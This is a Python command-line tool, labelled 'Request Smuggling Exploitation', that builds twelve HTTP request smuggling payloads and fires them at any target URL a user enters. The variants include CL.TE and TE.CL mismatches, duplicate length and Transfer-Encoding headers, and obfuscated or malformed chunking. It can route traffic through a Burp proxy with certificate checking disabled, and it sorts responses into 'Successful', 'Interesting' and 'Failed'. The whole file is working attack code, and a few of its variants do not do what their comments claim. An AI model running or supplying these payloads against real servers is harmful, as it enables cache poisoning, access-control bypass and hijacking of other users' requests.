#!/usr/bin/env python3
import argparse
import socket
import ssl
import subprocess
import os
from urllib.parse import urlparse
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# ------------------------------
# Utilities
# ------------------------------

def make_inner_request(method: str, path: str, host_header: str) -> str:
    # Inner duplicated request with proper CRLF termination
    # Example:
    # GET /search.php?test=query HTTP/1.1\r\n
    # Host: testphp.vulnweb.com\r\n
    # \r\n
    return f"{method} {path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"

def ensure_host_header(host: str) -> str:
    # Host header must be hostname (no scheme, no path)
    return host

def recv_all(sock, timeout=4):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    return b"".join(chunks)

def dial(host: str, port: int, use_tls: bool, cafile: str | None, disable_verify: bool):
    raw = socket.create_connection((host, port), timeout=8)
    if not use_tls:
        return raw
    # TLS wrapper
    if disable_verify:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    else:
        ctx = ssl.create_default_context(cafile=cafile) if cafile else ssl.create_default_context()
    return ctx.wrap_socket(raw, server_hostname=host)

def send_raw(connect_host, connect_port, payload_bytes, use_tls=False, cafile=None, disable_verify=True):
    s = dial(connect_host, connect_port, use_tls, cafile, disable_verify)
    s.sendall(payload_bytes)
    resp = recv_all(s)
    s.close()
    return resp

def classify_response(resp_bytes: bytes) -> str:
    text = resp_bytes.decode(errors="ignore")
    # Basic heuristics
    if "HTTP/1.1 2" in text or "HTTP/1.0 2" in text:
        return "Successful"
    if "HTTP/1.1 3" in text:
        return "Interesting"
    if "HTTP/1.1 4" in text or "HTTP/1.1 5" in text:
        return "Failed"
    # Burp landing page or proxied messages can be interesting
    if "Burp Suite" in text:
        return "Interesting"
    return "Interesting" if text else "Failed"

# ------------------------------
# Payload builders (PortSwigger techniques)
# Each returns bytes
# ------------------------------

def build_cl_te_mismatch(host_header, inner_req, path="/"):
    # TE present but body ends with chunked terminator, then inner request
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

def build_te_cl_reverse(host_header, inner_req, path="/"):
    # Chunked body declares a chunk but CL smaller; common desync variant
    # One small chunk then end, followed by inner request
    body = "1\r\nX\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 5\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body}"
    ).encode() + inner_req.encode()

def build_duplicate_cl(host_header, inner_req, path="/"):
    # Two Content-Length headers; origin vs front-end disagreement
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Length: 4\r\n"
        "Content-Length: 100\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "TEST\r\n"
        "\r\n"
    ).encode() + inner_req.encode()

def build_embedded_direct(host_header, inner_req, path="/"):
    # Body is exactly the inner request with correct length
    body = inner_req
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body}"
    ).encode()

def build_te_obfuscated(host_header, inner_req, path="/"):
    # Obfuscate TE header
    # Transfer-Encoding: chunked with case/space/semicolon variations
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding:    chunked\r\n"
        "Transfer-Encoding: chunked;foo=bar\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

def build_lf_termination(host_header, inner_req, path="/"):
    # Use lone LF in body delimiting to trigger parser quirks
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\n\n"
    ).encode() + inner_req.encode()

def build_space_in_method(host_header, inner_req_path, path="/"):
    # Leading space in method line of inner request
    inner = f"GET {inner_req_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n"
    inner = " " + inner  # prepend space to try method-line obfuscation
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Content-Length: {len(inner)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{inner}"
    ).encode()

def build_header_folding(host_header, inner_req, path="/"):
    # Obsolete header folding (line wrapping) to confuse parsers
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding:\tchunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

def build_duplicate_te(host_header, inner_req, path="/"):
    # Two TE headers, one valid, one invalid, to cause disagreement
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

def build_chunk_size_tamper(host_header, inner_req, path="/"):
    # Tamper chunk size with hex vs decimal confusion
    body = "A\r\nXXXXXXXXXX\r\n0\r\n\r\n"  # 10 bytes chunk in hex
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body}"
    ).encode() + inner_req.encode()

def build_te_uppercase(host_header, inner_req, path="/"):
    # Case variance in TE header
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Transfer-Encoding: CHUNKED\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

def build_crlf_in_header(host_header, inner_req, path="/"):
    # Try CRLF injection in header values (some proxies mishandle)
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "X-Header: value\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode() + inner_req.encode()

# ------------------------------
# Suite runner
# ------------------------------

TECHNIQUES = [
    ("CL_TE mismatch", build_cl_te_mismatch),
    ("TE_CL reverse", build_te_cl_reverse),
    ("Duplicate Content-Length", build_duplicate_cl),
    ("Embedded direct", build_embedded_direct),
    ("Obfuscated TE", build_te_obfuscated),
    ("LF termination", build_lf_termination),
    ("Space in inner method", build_space_in_method),
    ("Header folding (obsolete)", build_header_folding),
    ("Duplicate Transfer-Encoding", build_duplicate_te),
    ("Chunk size tamper (hex)", build_chunk_size_tamper),
    ("TE uppercase", build_te_uppercase),
    ("CRLF in header value", build_crlf_in_header),
]

def run_suite(connect_host, connect_port, target_host_header, scheme, inner_method, inner_path, cafile, disable_verify):
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running request smuggling suite ===" + Style.RESET_ALL)
    use_tls = (scheme == "https")

    results = {"Successful": [], "Interesting": [], "Failed": []}

    for name, builder in TECHNIQUES:
        try:
            if builder == build_space_in_method:
                payload = builder(target_host_header, inner_path)  # path string for inner method variant
            else:
                inner = make_inner_request(inner_method, inner_path, target_host_header)
                payload = builder(target_host_header, inner)
            # Show payload preview
            print(Fore.YELLOW + f"\n--- Technique: {name} ---" + Style.RESET_ALL)
            print(payload.decode(errors="ignore"))

            resp = send_raw(connect_host, connect_port, payload, use_tls=use_tls, cafile=cafile, disable_verify=disable_verify)
            cls = classify_response(resp)
            results[cls].append(name)

            # Print response head
            print(Fore.CYAN + "\n=== Response (first 800 bytes) ===" + Style.RESET_ALL)
            print(resp[:800].decode(errors="ignore"))
        except Exception as e:
            print(Fore.RED + f"[!] Error during {name}: {e}" + Style.RESET_ALL)
            results["Failed"].append(name)

    # Summary
    print(Fore.BLUE + Style.BRIGHT + "\n=== Smuggling Summary ===" + Style.RESET_ALL)
    for group in ["Successful", "Interesting", "Failed"]:
        items = results[group]
        print(f"{Fore.GREEN if group=='Successful' else (Fore.YELLOW if group=='Interesting' else Fore.RED)}{group}:{Style.RESET_ALL}")
        if not items:
            print("  - None")
        else:
            for i in items:
                print(f"  - {i}")

    print(Fore.CYAN + f"\nCompleted at {datetime.now().isoformat(timespec='seconds')}" + Style.RESET_ALL)

# ------------------------------
# Interactive CLI
# ------------------------------

def main():
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== Request Smuggling Exploitation ===\n" + Style.RESET_ALL)

    target_url = input("Target URL (e.g. https://www.example.com/): ").strip()
    parsed = urlparse(target_url if "://" in target_url else ("https://" + target_url))
    scheme = parsed.scheme.lower()
    host = parsed.hostname or ""
    port = parsed.port or (443 if scheme == "https" else 80)
    base_path = parsed.path or "/"

    host_header = ensure_host_header(host)
    print(f"\nTarget parsed → Scheme: {scheme} | Host: {host_header} | Port: {port} | Base path: {base_path}")

    inner_method = input("Inner request method [default GET]: ").strip().upper() or "GET"
    inner_path = input(f"Inner request path [default {base_path}]: ").strip() or base_path

    proxy = input("Proxy for interception (ip:port) [blank = none]: ").strip()
    if proxy:
        try:
            connect_host, connect_port = proxy.split(":")
            connect_port = int(connect_port)
            print(f"[+] Using proxy {connect_host}:{connect_port} for TCP connect")
        except Exception:
            print(Fore.RED + "[!] Invalid proxy format. Use ip:port (e.g., 127.0.0.1:8080)" + Style.RESET_ALL)
            return
    else:
        connect_host, connect_port = host, port
        print("[+] No proxy; connecting directly to origin")

    print("\nTLS trust options:")
    print("  1) Disable verification (easiest with Burp interception)")
    print("  2) Provide CA file (burp_ca.crt) for proper trust")
    trust_opt = input("Select [1/2, default 1]: ").strip() or "1"
    disable_verify = True
    cafile = None
    if trust_opt == "2":
        cafile = input("Path to CA file (e.g., burp_ca.crt): ").strip()
        disable_verify = False

    # --- Run suite(s) ---
    if scheme == "https":
        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTPS suite ===" + Style.RESET_ALL)
        run_suite(connect_host, connect_port, host_header, "https",
                  inner_method, inner_path, cafile, disable_verify)

        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Running HTTP suite ===" + Style.RESET_ALL)
        # Force HTTP run on port 80
        run_suite(connect_host, 80, host_header, "http",
                  inner_method, inner_path, cafile, True)
    else:
        run_suite(connect_host, connect_port, host_header, "http",
                  inner_method, inner_path, cafile, True)

if __name__ == "__main__":
    main()
